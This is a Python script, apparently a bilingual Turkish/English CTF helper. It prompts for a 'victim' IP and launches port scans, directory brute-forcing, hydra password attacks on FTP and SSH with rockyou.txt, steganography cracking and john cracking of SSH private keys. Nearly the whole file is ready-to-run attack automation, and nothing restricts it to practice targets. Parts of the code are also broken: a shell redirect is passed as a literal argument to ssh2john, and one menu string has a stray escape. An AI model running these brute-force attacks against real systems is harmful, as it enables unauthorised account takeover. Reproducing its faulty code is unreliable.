import subprocess
import os
import colorama
from colorama import Fore
import base64
import time
import random
from util import version_control

colorama.init(autoreset=True)

texts = ["""
 ######  ######## ########            ###    ##     ## ########  #######  ##     ##    ###    ######## ####  #######  ##    ## 
##    ##    ##    ##                 ## ##   ##     ##    ##    ##     ## ###   ###   ## ##      ##     ##  ##     ## ###   ## 
##          ##    ##                ##   ##  ##     ##    ##    ##     ## #### ####  ##   ##     ##     ##  ##     ## ####  ## 
##          ##    ######   ####### ##     ## ##     ##    ##    ##     ## ## ### ## ##     ##    ##     ##  ##     ## ## ## ## 
##          ##    ##               ######### ##     ##    ##    ##     ## ##     ## #########    ##     ##  ##     ## ##  #### 
##    ##    ##    ##               ##     ## ##     ##    ##    ##     ## ##     ## ##     ##    ##     ##  ##     ## ##   ### 
 ######     ##    ##               ##     ##  #######     ##     #######  ##     ## ##     ##    ##    ####  #######  ##    ##
""","""
 .o88b. d888888b d88888b         .d8b.  db    db d888888b  .d88b.  .88b  d88.  .d8b.  d888888b d888888b  .d88b.  d8b   db 
d8P  Y8 `~~88~~' 88'            d8' `8b 88    88 `~~88~~' .8P  Y8. 88'YbdP`88 d8' `8b `~~88~~'   `88'   .8P  Y8. 888o  88 
8P         88    88ooo          88ooo88 88    88    88    88    88 88  88  88 88ooo88    88       88    88    88 88V8o 88 
8b         88    88~~~   C8888D 88~~~88 88    88    88    88    88 88  88  88 88~~~88    88       88    88    88 88 V8o88 
Y8b  d8    88    88             88   88 88b  d88    88    `8b  d8' 88  88  88 88   88    88      .88.   `8b  d8' 88  V888 
 `Y88P'    YP    YP             YP   YP ~Y8888P'    YP     `Y88P'  YP  YP  YP YP   YP    YP    Y888888P  `Y88P'  VP   V8P
""","""
  _____ _______ ______                  _                        _   _             
 / ____|__   __|  ____|      /\        | |                      | | (_)            
| |       | |  | |__ ______ /  \  _   _| |_ ___  _ __ ___   __ _| |_ _  ___  _ __  
| |       | |  |  __|______/ /\ \| | | | __/ _ \| '_ ` _ \ / _` | __| |/ _ \| '_ \ 
| |____   | |  | |        / ____ \ |_| | || (_) | | | | | | (_| | |_| | (_) | | | |
 \_____|  |_|  |_|       /_/    \_\__,_|\__\___/|_| |_| |_|\__,_|\__|_|\___/|_| |_|
""","""
 ______ _______ _______        _______         __                         __   __              
|      |_     _|    ___|______|   _   |.--.--.|  |_.-----.--------.---.-.|  |_|__|.-----.-----.
|   ---| |   | |    ___|______|       ||  |  ||   _|  _  |        |  _  ||   _|  ||  _  |     |
|______| |___| |___|          |___|___||_____||____|_____|__|__|__|___._||____|__||_____|__|__|
""","""
.|'''', |''||''| '||''''|          /.\                 ||                                ||                         
||         ||     ||  .           // \\                ||                                ||     ''                  
||         ||     ||''|   ---    //...\\    '||  ||` ''||''  .|''|, '||),,(|,   '''|.  ''||''   ||  .|''|, `||''|,  
||         ||     ||            //     \\    ||  ||    ||    ||  ||  || || ||  .|''||    ||     ||  ||  ||  ||  ||  
`|....'   .||.   .||.         .//       \\.  `|..'|.   `|..' `|..|' .||    ||. `|..||.   `|..' .||. `|..|' .||  ||
"""]

subprocess.call(["clear"])
colors = [Fore.RED,Fore.BLUE,Fore.GREEN,Fore.MAGENTA,Fore.YELLOW]
font = random.choice(texts)
color = random.choice(colors)
print(color+font)
time.sleep(1.5)
print(Fore.GREEN+"Simple ctf automation tool.")
print(Fore.RED+"\t\t\t\t\t\t\t\tCoded by Yigit Aydemir")
time.sleep(1)



class Automation():
    def __init__(self):
        try:
            print(Fore.YELLOW+"\n\nEnter victim's IP address // Kurban makinenin IP adresini giriniz :")
            ip = input(Fore.RED+"IP address // IP adresi :")
            self.ip = ip
        except KeyboardInterrupt:
            print(Fore.BLUE+"CTRL+C algilandi.Cikis yapiliyor...")
            exit()


    def TR_Menu(self):
        return "Saldirmakta oldugunuz IP adresi :"+self.ip+Fore.GREEN+"""
        1.Nmap ile kurban makinenin portlarini tara.
        2.Gobuster ile kurban makinede klasor,dosya kesfi yap.
        3.Hydra ile ftp sifresi kir(brute force)
        4.Hydra ile ssh sifresi kir(brute force)
        5.Steghide ile resim dosyasinin icindeki gizli dosyalari bul.
        6.Stegcracker ile bir resim dosyasinin icindeki dosyanin sifresini kir.
        7.John ile ID_RSA anahtari kir.
        8.Base64 dekript et.
        9.Cikis
        """
    def EN_Menu(self):
        return "IP address you are attacking to :" + self.ip + Fore.GREEN + """
                1.Scan the victim's ports using nmap.
                2.Scan the hidden directories with gobuster.
                3.Crack the victim FTP server(brute force)
                4.Crack the victim SSH server(brute force)
                5.Extract hidden files from images using steghide.
                6.Crack the password of stegged files using stegcracker.
                7.Crack the ID_RSA key with john.
                8.Decode base64 texts.
                9.Exit
                """



    def TR_Main(self):
        while True:
            try:
                time.sleep(0.5)
                subprocess.call(["clear"])
                print(Fore.GREEN + self.TR_Menu())
                print(Fore.RED+"Konsol@Otomasyon")
                command = int(input(Fore.BLUE+"     ╰──------>Komut:"))
                if command == 1:
                    print(Fore.MAGENTA+"Nmap taramasi baslatildi.Tarama sonuclari onunuze acilan pencerededir.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                    subprocess.call(["xterm","-T","Portlar taraniyor...","-hold","-fg","blue","-e","nmap","-T4","-A","-v",self.ip])
                elif command == 2:
                    print(Fore.MAGENTA+"Ozel olarak bir website adresi belirtmek istiyorsaniz yaziniz.Bos birakirsaniz sadece ip adresindeki web server'a saldiri yapilacak.Ornegin : http://10.10.172.11 gibi.")
                    website = input(Fore.YELLOW+"Website adresi(http ile birlikte) :")
                    if website == "":
                        print(Fore.RED+"Websiteniz "+"http://"+self.ip+" olarak ayarlandi.")
                        website = "http://"+self.ip
                        subprocess.call(["xterm", "-T", "Klasorler taraniyor...", "-hold", "-fg", "red", "-e", "gobuster", "dir","-t","100","-u",website,"-w","/usr/share/dirb/wordlists/common.txt","-x","php,html,txt"])
                        print(Fore.MAGENTA + "Gobuster ile klasor,dosya taramasi baslatildi..Tarama sonuclari onunuze acilan pencerededir.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                    else:
                        print(Fore.RED+"Websiteniz"+website+" olarak ayarlandi.")
                        subprocess.call(["xterm", "-T", "Klasorler taraniyor...", "-hold", "-fg", "red", "-e", "gobuster", "dir","-t","100", "-u", website,"-w", "/usr/share/dirb/wordlists/common.txt", "-x", "php,html,txt"])
                        print(Fore.MAGENTA + "Gobuster ile klasor,dosya taramasi baslatildi..Tarama sonuclari onunuze acilan pencerededir.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                elif command == 3:
                    ftp_address = "ftp://"+self.ip
                    print(Fore.RED+"1.Tek kullanici adi ve sifre listesi ile brute force.\n2.Kullanici listesi ve tek sifre ile brute force.\n3.Kullanici listesi ve sifre listesi ile brute force.\n4.Geri\n5.Cikis ")
                    choice = int(input(Fore.BLUE+"Seciminiz :"))
                    if choice == 1:
                        username = input(Fore.GREEN+"Kullanici adi giriniz :")
                        wordlist = input(Fore.GREEN+"Sifre listesi giriniz(Bos birakirsaniz rockyou.txt kullanilacaktir.) : ")
                        if wordlist == "":
                            wordlist = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA+"Hydra ile ftp sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm","-T","FTP sifresi kiriliyor...","-hold","-fg","green","-e","hydra","-l",username,"-P",wordlist,ftp_address])
                    if choice == 2:
                        username_list = input(Fore.GREEN + "Kullanici listesi giriniz :")
                        password = input(Fore.GREEN + "Sifre giriniz : ")
                        print(Fore.MAGENTA + "Hydra ile ftp sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm", "-T", "FTP sifresi kiriliyor...", "-hold", "-fg", "green", "-e", "hydra", "-L", username_list,"-p", password, ftp_address])
                    if choice == 3:
                        username_list = input(Fore.GREEN + "Kullanici listesi giriniz :")
                        password_list = input(Fore.GREEN + "Sifre listesi giriniz(Bos birakirsaniz rockyou.txt kullanilacaktir.) : ")
                        if password_list == "":
                            password_list = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "Hydra ile ftp sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm", "-T", "FTP sifresi kiriliyor...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-P", password_list, ftp_address])
                    elif choice == 4:
                        self.TR_Main()
                    elif choice == 5:
                        exit()
                elif command == 4:
                    ssh_address = "ssh://" + self.ip
                    print(Fore.RED + "1.Tek kullanici adi ve sifre listesi ile brute force.\n2.Kullanici listesi ve tek sifre ile brute force.\n3.Kullanici listesi ve sifre listesi ile brute force.\4.Geri\n5.Cikis ")
                    choice = int(input(Fore.BLUE + "Seciminiz :"))
                    if choice == 1:
                        username = input(Fore.GREEN + "Kullanici adi giriniz :")
                        wordlist = input(Fore.GREEN + "Sifre listesi giriniz(Bos birakirsaniz rockyou.txt kullanilacaktir.) : ")
                        if wordlist == "":
                            wordlist = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "Hydra ile ssh sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm", "-T", "SSH sifresi kiriliyor...", "-hold", "-fg", "green", "-e", "hydra", "-l", username,"-P", wordlist, ssh_address])
                    if choice == 2:
                        username_list = input(Fore.GREEN + "Kullanici listesi giriniz :")
                        password = input(Fore.GREEN + "Sifre giriniz : ")
                        print(Fore.MAGENTA + "Hydra ile ssh sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm", "-T", "SSH sifresi kiriliyor...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-p", password, ssh_address])
                    if choice == 3:
                        username_list = input(Fore.GREEN + "Kullanici listesi giriniz :")
                        password_list = input(Fore.GREEN + "Sifre listesi giriniz(Bos birakirsaniz rockyou.txt kullanilacaktir.) : ")
                        if password_list == "":
                            password_list = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "Hydra ile ssh sifre kirma saldirisi baslatildi.Acilan pencerede isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                        subprocess.call(["xterm", "-T", "SSH sifresi kiriliyor...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-P", password_list, ssh_address])
                    elif choice == 4:
                        self.TR_Main()
                    elif choice == 5:
                        exit()
                elif command == 5:
                    file_to_be_extracted = input(Fore.BLUE+"Gizli bilgi cikarilacak dosyayi giriniz :")
                    print(Fore.MAGENTA+"Gizli bilgiyi cikartmak icin bir sifre gerekiyor.Bu sifreyi acilan diger terminale yazip gizli bilgiyi cikarabilirsiniz.O terminalde isiniz bitince o pencereyi kapatip buradan devam edebilirsiniz.")
                    subprocess.call(["xterm","-T","Steghide","-hold","-fg","yellow","-e","steghide","extract","-sf",file_to_be_extracted])
                elif command == 6:
                    file_to_be_bruteforced = input(Fore.GREEN+"Brute force edilecek resim dosyasini giriniz :")
                    wordlist = input(Fore.GREEN+"Wordlist giriniz(Bos birakirsaniz rockyou.txt kullanilacaktir.) : ")
                    if wordlist == "":
                        wordlist = "/usr/share/wordlists/rockyou.txt"
                    print(Fore.MAGENTA+"Resim dosyasinin sifresi kiriliyor.Diger terminalde durumu gorebilirsiniz.Diger terminalde isiniz bittiginde o terminali kapatip bu terminalden devam edebilirsiniz.")
                    subprocess.call(["xterm","-T","Resim dosyasinin sifresi kiriliyor...","-hold","-fg","red","-e","stegcracker",file_to_be_bruteforced,wordlist])
                elif command == 7:
                    id_rsa_file = input(Fore.CYAN+"ID_RSA dosyasini giriniz :")
                    wordlist = input(Fore.CYAN+"Wordlist giriniz(Bos birakirsaniz rockyou.txt kullanilacak.) :")
                    if wordlist == "":
                        wordlist = "/usr/share/wordlists/rockyou.txt"
                    subprocess.call(["chmod","600",id_rsa_file])
                    subprocess.call(["ssh2john",id_rsa_file,">","hashed.hash"])
                    print(Fore.MAGENTA+"ID_RSA sifresini kirma islemi basladi.Onunuze iki terminal acilacak biri john'un calistigi yer.Digeri ise cikan sonuc.Sifre eger bulunduysa sonuc kisminda yazacak.")
                    john_command = "--wordlist="+wordlist
                    subprocess.call(["xterm","-T","ID_RSA sifresi kiriliyor...","-hold","-fg","red","-e","john",john_command,"hashed.hash"])
                    subprocess.call(["xterm","-T","Sonuc","-hold","-fg","blue","-e","john","--show","hashed.hash"])
                elif command == 8:
                    text_to_be_decrypted = input(Fore.RED+"Desifre edilecek yaziyi giriniz :")
                    try:
                        decoded_text = base64.b64decode(text_to_be_decrypted).decode("utf-8")
                        print(Fore.MAGENTA+"Desifre edilmis sifre : "+decoded_text)
                    except UnicodeDecodeError:
                        print(Fore.BLUE+"Belirttiginiz yazi decode edilemiyor...")
                        time.sleep(1)
                        exit()
                elif command == 9:
                    exit()
                else:
                    print(Fore.RED+"Yanlis komut girdiniz lutfen tekrar deneyiniz !")
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX+"CTRL+C algilandi.Cikis yapiliyor...")
                exit()



    def EN_Main(self):
        while True:
            try:
                time.sleep(0.5)
                subprocess.call(["clear"])
                print(Fore.GREEN + self.EN_Menu())
                print(Fore.RED+"Console@Automation")
                command = int(input(Fore.BLUE+"     ╰──------>Command:"))
                if command == 1:
                    print(Fore.MAGENTA+"The nmap scan is started.Close the terminal when you are done.")
                    subprocess.call(["xterm","-T","Scanning the ports...","-hold","-fg","blue","-e","nmap","-T4","-A","-v",self.ip])
                elif command == 2:
                    print(Fore.MAGENTA+"Enter a web address.If you don't, the address will be like this 'http://10.10.171.23")
                    website = input(Fore.YELLOW+"Website address(with http) :")
                    if website == "":
                        print(Fore.RED+"Your web address is "+"http://"+self.ip+" set up.")
                        website = "http://"+self.ip
                        subprocess.call(["xterm", "-T", "Scaning the directories...", "-hold", "-fg", "red", "-e", "gobuster", "dir","-t","100","-u",website,"-w","/usr/share/dirb/wordlists/common.txt","-x","php,html,txt"])
                        print(Fore.MAGENTA + "The directory scan is started.Close the terminal when you are done.")
                    else:
                        print(Fore.RED+"Your web address is"+website+" set up.")
                        subprocess.call(["xterm", "-T", "Scaning the directories...", "-hold", "-fg", "red", "-e", "gobuster", "dir","-t","100", "-u", website,"-w", "/usr/share/dirb/wordlists/common.txt", "-x", "php,html,txt"])
                        print(Fore.MAGENTA + "The directory scan is started.Close the terminal when you are done.")
                elif command == 3:
                    ftp_address = "ftp://"+self.ip
                    print(Fore.RED+"1.One username and password list brute force.\n2.Username list and one password brute force.\n3.Username list and password list brute force.\n4.Back\n5.Exit ")
                    choice = int(input(Fore.BLUE+"Choice :"))
                    if choice == 1:
                        username = input(Fore.GREEN+"Enter username :")
                        wordlist = input(Fore.GREEN+"Enter password list(If you black,the script uses the rockyou.txt automatically.) : ")
                        if wordlist == "":
                            wordlist = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA+"FTP attack is started.Close the terminal when you are done.")
                        subprocess.call(["xterm","-T","FTP brute forcing...","-hold","-fg","green","-e","hydra","-l",username,"-P",wordlist,ftp_address])
                    if choice == 2:
                        username_list = input(Fore.GREEN + "Enter username wordlist :")
                        password = input(Fore.GREEN + "Enter password : ")
                        print(Fore.MAGENTA + "FTP attack is started.Close the terminal when you are done.")
                        subprocess.call(["xterm", "-T", "FTP brute forcing...", "-hold", "-fg", "green", "-e", "hydra", "-L", username_list,"-p", password,ftp_address])
                    if choice == 3:
                        username_list = input(Fore.GREEN + "Enter username list :")
                        password_list = input(Fore.GREEN + "Enter password list(If you blank,the script uses the rockyou.txt automatically.) : ")
                        if password_list == "":
                            password_list = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "FTP attack is started.Close the terminal when you are done.")
                        subprocess.call(["xterm", "-T", "FTP brute forcing...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-P", password_list, ftp_address])
                    elif choice == 4:
                        self.EN_Main()
                    elif choice == 5:
                        exit()
                elif command == 4:
                    ssh_address = "ssh://" + self.ip
                    print(Fore.RED + "1.One username and password list brute force.\n2.Username list and one password brute force.\n3.Username list and password list brute force.\n4.Back\n5.Exit  ")
                    choice = int(input(Fore.BLUE + "Choice :"))
                    if choice == 1:
                        username = input(Fore.GREEN + "Enter username :")
                        wordlist = input(Fore.GREEN + "Enter password list(If you black,the script uses the rockyou.txt automatically.) : ")
                        if wordlist == "":
                            wordlist = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "SSH brute force started.Close the terminal when you are done.")
                        subprocess.call(["xterm", "-T", "SSH brute forcing...", "-hold", "-fg", "green", "-e", "hydra", "-l", username,"-P", wordlist,ssh_address])
                    if choice == 2:
                        username_list = input(Fore.GREEN + "Enter username list :")
                        password = input(Fore.GREEN + "Enter password : ")
                        print(Fore.MAGENTA + "SSH brute force started.Close the terminal when you are done.")
                        subprocess.call(["xterm", "-T", "SSH brute forcing...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-p", password,ssh_address])
                    if choice == 3:
                        username_list = input(Fore.GREEN + "Enter username list :")
                        password_list = input(Fore.GREEN + "Enter password list(If you black,the script uses the rockyou.txt automatically.) : ")
                        if password_list == "":
                            password_list = "/usr/share/wordlists/rockyou.txt"
                        print(Fore.MAGENTA + "SSH brute force started.Close the terminal when you are done.")
                        subprocess.call(["xterm", "-T", "SSH brute forcing...", "-hold", "-fg", "green", "-e", "hydra", "-L",username_list, "-P", password_list, ssh_address])
                    elif choice == 4:
                        self.EN_Main()
                    elif choice == 5:
                        exit()
                elif command == 5:
                    file_to_be_extracted = input(Fore.BLUE+"Enter the file you want to extract :")
                    print(Fore.MAGENTA+"You need a password to extract files from stegged file.You must enter the password to opened terminal.")
                    subprocess.call(["xterm","-T","Steghide","-hold","-fg","yellow","-e","steghide","extract","-sf",file_to_be_extracted])
                elif command == 6:
                    file_to_be_bruteforced = input(Fore.GREEN+"Enter the file you want to brute force :")
                    wordlist = input(Fore.GREEN+"Enter wordlist(If you blank,the script uses the rockyou.txt automatically.) : ")
                    if wordlist == "":
                        wordlist = "/usr/share/wordlists/rockyou.txt"
                    print(Fore.MAGENTA+"Brute forcing stegged file.You can check status on opened terminal.")
                    subprocess.call(["xterm","-T","Brute forcing stegged file...","-hold","-fg","red","-e","stegcracker",file_to_be_bruteforced,wordlist])
                elif command == 7:
                    id_rsa_file = input(Fore.CYAN+"Enter ID_RSA key file :")
                    wordlist = input(Fore.CYAN+"Enter wordlist(If you blank,the script uses rockyou.txt automatically.) :")
                    if wordlist == "":
                        wordlist = "/usr/share/wordlists/rockyou.txt"
                    subprocess.call(["chmod","600",id_rsa_file])
                    subprocess.call(["ssh2john",id_rsa_file,">","hashed.hash"])
                    print(Fore.MAGENTA+"Brute forcing ID_RSA file.You can check status on other terminals.")
                    john_command = "--wordlist="+wordlist
                    subprocess.call(["xterm","-T","Brute forcing ID_RSA key...","-hold","-fg","red","-e","john",john_command,"hashed.hash"])
                    subprocess.call(["xterm","-T","Result","-hold","-fg","blue","-e","john","--show","hashed.hash"])
                elif command == 8:
                    text_to_be_decrypted = input(Fore.RED+"Enter the base64 encoded text :")
                    try:
                        decoded_text = base64.b64decode(text_to_be_decrypted).decode("utf-8")
                        print(Fore.MAGENTA+"Here is the result : "+decoded_text)
                        exit()
                    except UnicodeDecodeError:
                        print(Fore.BLUE+"Can't decode the text you specified...")
                        time.sleep(1)
                        exit()
                elif command == 9:
                    exit()
                else:
                    print(Fore.RED+"Wrong command.Please use other commands !")
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX+"CTRL+C detected.Exiting...")
                exit()


def Check_Do_Updates():
    is_updated = version_control.Is_Update_Avaliable()
    if is_updated:
        print("Your version is updated.Opening the program...")
        time.sleep(1)
    else:
        print(Fore.RED+"An update available.Do you want to download and setup?(Y/N)")
        answer = input(Fore.YELLOW+"Make an update?(Y/N) :")
        if answer == "Y" or answer == "y":
            version_control.Update()
            print(Fore.BLUE+"Update completed successfuly.You can use updated_ctf-automation file.")
            exit()
        elif answer == "N" or answer == "n":
            print(Fore.GREEN+"ctf-automation won't be updated.The program starting...")
            time.sleep(1)
        else:
            print(Fore.RED+"Wrong choice.Please choose again.")
            Check_Do_Updates()

Check_Do_Updates()
            
              

if os.path.exists("automation.cfg"):
    with open("automation.cfg","r",encoding="utf-8") as file:
        language = file.read()
    if language == "tr":
        tr_automation = Automation()
        tr_automation.TR_Main()
    else:
        en_automation = Automation()
        en_automation.EN_Main()
else:
    print(Fore.BLUE+"Choose a language. // Dil seciniz :\n1.English \n2.Turkce")
    user_input = int(input(Fore.RED+"Your Choice // Seciminiz : "))
    if user_input == 1:
        print(Fore.GREEN+"Your language is set to English.")
        with open("automation.cfg","a",encoding="utf-8") as file:
            file.write("en")
        en_automation = Automation()
        en_automation.EN_Main()
    elif user_input == 2:
        print(Fore.GREEN + "Diliniz turkce olarak ayarlandi.")
        with open("automation.cfg", "a", encoding="utf-8") as file:
            file.write("tr")
        tr_automation = Automation()
        tr_automation.TR_Main()
    else:
        print(Fore.MAGENTA+"Please choose a correct option.(1 or 2).Lutfen dogru secim yapiniz.(1 veya 2)")
        exit()
